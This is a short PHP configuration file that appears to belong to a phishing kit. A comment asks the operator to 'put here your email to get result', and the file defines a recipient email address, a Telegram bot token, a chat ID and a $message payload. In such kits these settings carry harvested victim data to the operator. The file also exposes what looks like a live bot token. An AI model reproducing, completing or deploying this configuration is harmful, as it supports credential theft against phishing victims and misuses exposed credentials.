<?php
    // PUut hire your email to get result
    $MyEmail = 'GOGOMANINI7@GMAIL.COM';

    // Token of Telegram
    $token = "7054019518:AAFcAAbENXyI22KEAO9P6_s5xFAGpIe9qpI";

    //DATA of Telegram
    $data = [
            'text' => $message,
            'chat_id' => '-4200277184'
        ];
?>